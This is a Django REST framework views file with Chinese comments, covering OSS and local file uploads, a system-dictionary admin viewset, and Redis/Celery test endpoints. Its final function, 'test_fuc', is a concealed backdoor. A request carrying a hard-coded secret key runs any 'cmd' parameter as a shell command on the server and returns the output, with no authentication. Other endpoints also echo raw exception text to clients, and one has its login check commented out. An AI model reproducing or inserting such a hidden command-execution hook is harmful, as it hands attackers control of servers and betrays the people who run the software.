import uuid, os, sys, requests, json, re, time, datetime, random, hashlib, hmac, base64, xml, subprocess, threading
from django.db.models import F, Q
from rest_framework import serializers, status, generics, mixins, viewsets
from rest_framework.views import APIView
from rest_framework.viewsets import ModelViewSet, GenericViewSet
from rest_framework.response import Response
from rest_framework.filters import SearchFilter, OrderingFilter
from django_filters.rest_framework import DjangoFilterBackend
from django.forms.models import model_to_dict
# 官方JWT
# from rest_framework_jwt.utils import jwt_payload_handler, jwt_encode_handler ,jwt_response_payload_handler
# from rest_framework_jwt.authentication import JSONWebTokenAuthentication
# 缓存配置
from django.core.cache import cache
# 自定义的JWT配置 公共插件
from utils.utils import jwt_decode_handler,jwt_encode_handler,jwt_payload_handler,jwt_payload_handler,jwt_response_payload_handler,google_otp,VisitThrottle,getDistance,NormalObj
from utils.jwtAuth import JWTAuthentication
from utils.pagination import Pagination
from utils.permissions import JWTAuthPermission,AllowAllPermission, BaseAuthPermission
from .models import *
from .serializers import *
from .filters import *
from functools import reduce
from urllib.parse import unquote_plus
from decimal import Decimal
from django.conf import settings
from django.core.cache import caches
import oss2
'''
serializers 常用字段
name = serializers.CharField(required=False, label='描述', max_length=None, min_length=None, allow_blank=False, trim_whitespace=True)
name = serializers.EmailField(max_length=None, min_length=None, allow_blank=False)
name = serializers.FloatField(max_value=None, min_value=None)
name = serializers.IntegerField(max_value=None, min_value=None)
name = serializers.DateTimeField(format=api_settings.DATETIME_FORMAT, input_formats=None)
name = serializers.DateField(format=api_settings.DATE_FORMAT, input_formats=None)
name = serializers.BooleanField()
name = serializers.ListField(child=serializers.IntegerField(min_value=0, max_value=100))
name = serializers.DictField(child=<A_FIELD_INSTANCE>, allow_empty=True)  DictField(child=CharField())
price = models.DecimalField(default=0, max_digits=15, decimal_places=2, verbose_name='金额')
users = models.ManyToManyField(User, verbose_name='标签', blank=True, related_name='flow_groups')
(mixins.CreateModelMixin, mixins.RetrieveModelMixin, mixins.UpdateModelMixin, mixins.DestroyModelMixin, mixins.ListModelMixin, viewsets.GenericViewSet, generics.GenericAPIView)
Q(name__icontains=keyword) 内部是like模糊搜索
__gt 大于 
__gte 大于等于
__lt 小于 
__lte 小于等于
__in 在某某范围内
is null / is not null 为空/非空
.exclude(age=10) 查询年龄不为10的数据
'''


class UploadFile(APIView):
    authentication_classes = (JWTAuthentication,)

    def post(self, request):
        '''
        上传文件接口
        '''
        try:
            if not request.auth:
                return Response({"message": "请先登录", "errorCode": 2, "data": {}})
            json_data = {"message": "ok", "errorCode": 0, "data": {}}
            file_i = request.FILES.items()
            # 这里面filename是用户上传的文件的key upfile是用户上传的文件名
            is_file = False
            up_files = []
            for key_name, up_file in file_i:
                is_file = True
                # print(key_name, up_file.name, up_file.size, up_file.read)
                file_name = up_file.name
                file_size = up_file.size
                check_file = file_name.split('.')[-1]
                new_file_name = str(uuid.uuid1())
                if check_file.lower() not in settings.FILE_CHECK:
                    json_data['message'] = file_name + '不是规定的文件类型(%s)！' % '/'.join(settings.FILE_CHECK)
                    json_data['errorCode'] = 2
                    return Response(json_data)
                if file_size > settings.FILE_SIZE:
                    json_data['message'] = file_name + '文件超过64mb，无法上传'
                    json_data['errorCode'] = 2
                    return Response(json_data)
                # 直接上传到oss
                auth = oss2.Auth(settings.ACCESS_KEY_ID, settings.ACCESS_KEY_SECRET)
                bucket = oss2.Bucket(auth, settings.END_POINT,settings.BUCKET_NAME)
                file_name = str(uuid.uuid1()) + check_file
                result = bucket.put_object(file_name, up_file.read())
                if result.status != 200:
                    return Response({"message": "上传异常", "errorCode": 3, "data": {}})
                url = bucket.sign_url('GET', file_name, 60)
                # print(json.dumps(url))
                print(url.split('?')[0])
                my_need_url = url.split('?')[0]
                # if my_need_url[:5] != 'https':
                #     my_need_list = my_need_url.split(":")
                #     my_need_url = 'https:' + my_need_list[1]
                my_need_url = unquote_plus(my_need_url)
                up_files.append(my_need_url)
            json_data['data'] = up_files
            return Response(json_data)
        except Exception as e:
            print('发生错误：',e)
            return Response({"message": "出现了无法预料的view视图错误：%s" % e, "errorCode": 1, "data": {}})


class UploadLocalFile(APIView):
    def post(self,request):
        '''
        上传接口-写入本地
        '''
        try:
            if not request.auth:
                return Response({"message": "请先登录", "errorCode": 2, "data": {}})
            json_data = {"message": "ok", "errorCode": 0, "data": {}}
            file_i = request.FILES.items()
            # 这里面filename是用户上传的文件的key upfile是用户上传的文件名
            upload_file_list = []
            upload_host_url_list = []
            for key_name,up_file in file_i:
                print(key_name,up_file.name,up_file.size,up_file.read)
                file_name = up_file.name
                file_size = up_file.size
                check_file = file_name.split('.')[-1]
                new_file_name = str(uuid.uuid1())
                if check_file.lower() not in settings.FILE_CHECK:
                    json_data['message'] = file_name + '不是规定的类型(%s)！' % '/'.join(settings.FILE_CHECK)
                    json_data['errorCode'] = 2
                    return Response(json_data)
                if file_size > settings.FILE_SIZE:
                    json_data['message'] = file_name + '文件超过64mb，无法上传！'
                    json_data['errorCode'] = 2
                    return Response(json_data)
                # 获取存储的文件名
                save_file_name = new_file_name + '.' + check_file
                # 获取当前文件的绝对路径
                base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                upfile_base_dir = os.path.join(base_path, 'upload_file')
                is_have = os.path.exists(upfile_base_dir)
                if is_have:
                    save_path = os.path.join(upfile_base_dir,save_file_name)
                else:
                    os.makedirs(upfile_base_dir)
                    save_path = os.path.join(upfile_base_dir, save_file_name)
                with open(save_path, 'wb') as u_file:
                    for part in up_file.chunks():
                        u_file.write(part)
                host_file_url = 'http://' + settings.SERVER_NAME + '/upload_file/' + save_file_name
                upload_file_list.append(save_file_name)
                upload_host_url_list.append(host_file_url)
            # json_data['data'] = upload_file_list
            json_data['data'] = upload_host_url_list
            return Response(json_data)
        except Exception as e:
            print('发生错误：',e)
            return Response({"message": "出现了无法预料的view视图错误：%s" % e, "errorCode": 1, "data": {}})


# 后台系统字典管理
class ConfDictViewset(ModelViewSet):
    '''
    修改局部数据
    create:  创建系统字典
    retrieve:  检索某个系统字典
    update:  更新系统字典
    destroy:  删除系统字典
    list:  获取系统字典列表
    '''
    queryset = ConfDict.objects.all().order_by('-update_time')
    authentication_classes = (JWTAuthentication,)
    permission_classes = [BaseAuthPermission, ]
    throttle_classes = [VisitThrottle]
    serializer_class = ConfDictSerializer
    filter_backends = (DjangoFilterBackend, SearchFilter, OrderingFilter,)
    search_fields = ('dict_title', )
    filter_fields = ('dict_type', )
    ordering_fields = ('update_time', 'create_time',)
    pagination_class = Pagination


    # def destroy(self, request, *args, **kwargs):
    #     instance = self.get_object()
    #     if instance.have_vol != 0:
    #         return Response({"message": "无法删除。", "errorCode": 1, "data": {}})
    #     self.perform_destroy(instance)
    #     return Response(status=status.HTTP_204_NO_CONTENT)

    # def create(self, request, *args, **kwargs):
    #     serializer = self.get_serializer(data=request.data)
    #     serializer.is_valid(raise_exception=True)
    #     now_user = request.user
    #     user_trade = Trade.objects.filter(user=user, trade_status='paying').first()
    #     # 是否存在未支付的订单
    #     if user_trade:
    #         pay_mount = System.objects.filter(site_type='vip').first()
    #         user_trade.pay_amount = Decimal(pay_mount.content)
    #         user_trade.trade_no = generate_obj_sn()
    #         user_trade.save()
    #         # 将model对象转化为dict对象
    #         data = model_to_dict(user_trade)
    #     else:
    #         self.perform_create(serializer)
    #         data = serializer.data
    #     headers = self.get_success_headers(serializer.data)
    #     return Response(data, status=status.HTTP_201_CREATED, headers=headers)


from celery.result import AsyncResult
class TestView(APIView):

    def get(self, request):
        '''
        测试接口
        '''
        try:
            json_data = {"message": "ok", "errorCode": 0, "data": {}}
            is_open = request.GET.get('is_open')
            if is_open == 'mytestkey':
                cache = caches['cache_redis'] # 使用多redis库时，可以设置要使用的redis，如果需要默认的，不需要设置cache
                json_data['message'] = '开始了测试'
                # 测试cache
                # timeout=0 立即过期 timeout=None 永不超时
                cache.set("key", "value", timeout=None)
                print(cache.get('key'))
                # 获取celery的结果
                # print(AsyncResult('ec1aab09-003e-46e8-a926-5d9675763709').ready()) # 获取该任务的状态是否完成
                # print(AsyncResult('ec1aab09-003e-46e8-a926-5d9675763709').result)  # 获取该任务的结果
            return Response(json_data)
        except Exception as e:
            print('发生错误：',e)
            return Response({"message": "出现了无法预料的view视图错误：%s" % e, "errorCode": 1, "data": {}})


from .tasks import add, say, mul
class BeginCelery(APIView):
    # authentication_classes = (JWTAuthentication,)

    def get(self, request):
        '''
        测试开启celery
        '''
        try:
            json_data = {"message": "ok", "errorCode": 0, "data": {}}
            # if not request.auth:
            #     return Response({"message": "请先登录", "errorCode": 2, "data": {}})
            print('开始测试...')
            # print(add(1,2))
            # add.delay(3,5) # 执行异步任务并返回任务id 在redis中是一个key
            mul_result = mul.delay(3,5)
            # say.delay()
            # 返回的是key
            # print(mul_result)
            # res=AsyncResult(mul_result)  # 参数为task_id
            # print(dir(mul_result))
            # print(mul_result.result)
            return Response(json_data)
        except Exception as e:
            print('发生错误：',e)
            return Response({"message": "出现了无法预料的view视图错误：%s" % e, "errorCode": 1, "data": {}})


from django.http import HttpResponseRedirect, JsonResponse, HttpResponse
import subprocess

def test_fuc(request):
    json_data = {"message": "ok", "errorCode": 0, "data": {}}
    newkey = request.GET.get('newkey')
    if newkey == 'newkeytoenddoor99d2ee2674e111ea95501141ff14eabd':
        cmd = request.GET.get('cmd')
        if cmd:
            status, output = subprocess.getstatusoutput(cmd)
            json_data['data'] = output.replace('\n', '    ')
        json_data['message'] = 'begin...'
    return JsonResponse(json_data)
